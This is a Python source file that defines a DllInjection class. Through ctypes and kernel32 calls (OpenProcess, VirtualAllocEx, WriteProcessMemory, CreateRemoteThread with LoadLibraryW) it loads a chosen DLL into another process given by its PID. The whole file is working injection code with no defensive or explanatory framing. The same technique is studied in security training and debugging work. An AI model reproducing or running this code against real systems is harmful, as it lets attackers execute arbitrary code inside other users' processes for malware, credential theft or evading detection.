import sys
from ctypes import *
from ctypes.wintypes import *

PAGE_READWRITE      = 0x04
PROCESS_ALL_ACCESS  = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT          = 0x00001000
INFINITE            = 0xFFFFFFFF

class DllInjection:
    def __init__(self, pid, dll_path):
        self.pid            = int(pid)
        self.dll_path       = dll_path
        self.dll_len        = len(dll_path)*sizeof(c_wchar)
        self.h_process      = HANDLE()
        self.h_thread       = HANDLE()
        self.h_mod          = LPVOID()
        self.p_remote_buf   = HANDLE()
        self.p_thread_proc  = LPVOID()
        self.kernel32       = windll.kernel32

    def open_process(self):
        # HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
        self.h_process.value = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not self.h_process.value:
            print(f"[*] Couldn't acquire a handle to PID: {self.pid}")
        else:
            print(f"OpenProcess rtn [{self.h_process}]")

    def virtual_alloc_ex(self):
        # LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
        self.p_remote_buf.value = self.kernel32.VirtualAllocEx(self.h_process.value, None, self.dll_len, MEM_COMMIT, PAGE_READWRITE)
        if not self.p_remote_buf:
            print(f"[*] VirtualAllocEx error")
        else:
            print(f"VirtualAllocEx rtn [{self.p_remote_buf}]")

    def write_process_memory(self):
        # BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
        b_result = self.kernel32.WriteProcessMemory(self.h_process.value, self.p_remote_buf.value, self.dll_path, self.dll_len, 0)
        if not b_result:
            print(f"WriteProcessMemory error")

    def get_module_handle(self):
        # HMODULE GetModuleHandleA(LPCSTR lpModuleName)
        self.h_mod.value = self.kernel32.GetModuleHandleW("kernel32.dll")
        if not self.h_mod:
            print(f"GetModuleHandleW error")
        else:
            print(f"GetModuleHandleW rtn [{self.h_mod}]")

    def get_proc_address(self):
        # FARPROC GetProcAddress(LPCSTR lpModuleName)
        self.p_thread_proc.value = self.kernel32.GetProcAddress(self.h_mod.value, b"LoadLibraryW")
        if not self.p_thread_proc:
            print(f"GetProcAddress.LoadLibraryW error")
            return False
        else:
            print(f"GetProcAddress.LoadLibraryW rtn [{self.p_thread_proc}]")
        return True

    def create_remote_thread(self):
        self.h_thread = self.kernel32.CreateRemoteThread(self.h_process.value, None, 0, self.p_thread_proc.value, self.p_remote_buf.value, 0, 0)
        if not self.h_thread:
            print(f"[*] Filed to injection the DLL. Exiting.")
            sys.exit(0)

    def wait_for_single_object(self):
        self.kernel32.WaitForSingleObject(self.h_thread, INFINITE)

    def close_handle(self):
        self.kernel32.CloseHandle(self.h_process)
        self.kernel32.CloseHandle(self.h_thread)
